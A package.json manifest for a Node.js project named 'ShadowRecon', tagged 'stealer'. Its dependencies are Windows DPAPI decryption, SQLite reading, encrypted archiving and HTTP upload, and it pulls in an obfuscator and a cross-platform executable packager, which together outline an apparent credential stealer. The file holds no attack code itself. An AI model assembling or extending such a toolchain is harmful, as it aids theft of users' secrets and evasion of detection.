{
  "name": "ShadowRecon",
  "version": "3.0.0",
  "description": "Clean, modular, and efficient data collection tool",
  "main": "src/main.js",
  "scripts": {
    "start": "node src/main.js",
    "build": "node build/builder.js",
    "dev": "cross-env NODE_ENV=development node src/main.js",
    "test": "echo \"No tests specified\" && exit 0",
    "lint": "echo \"No linting configured\" && exit 0"
  },
  "keywords": [
    "stealer",
    "data-collection",
    "modular",
    "efficient"
  ],
  "author": "ShadowRecon",
  "license": "MIT",
  "dependencies": {
    "@primno/dpapi": "^2.0.1",
    "archiver": "^5.3.1",
    "archiver-zip-encrypted": "^2.0.0",
    "axios": "^1.11.0",
    "better-sqlite3": "^12.2.0",
    "form-data": "^4.0.0"
  },
  "devDependencies": {
    "cross-env": "^10.0.0",
    "js-confuser": "^1.5.4",
    "pkg": "^5.8.1"
  },
  "engines": {
    "node": ">=14.0.0"
  },
  "pkg": {
    "assets": [
      "config.json",
      "node_modules/axios/dist/**/*",
      "node_modules/axios/lib/**/*"
    ],
    "targets": [
      "node16-win-x64",
      "node16-linux-x64",
      "node16-macos-x64"
    ],
    "outputPath": "dist",
    "scripts": [
      "node_modules/axios/**/*.js"
    ]
  },
  "repository": {
    "type": "git",
    "url": "https://github.com/0x72EB7BA9B69BF6AB/ShadowRecon-V3"
  }
}
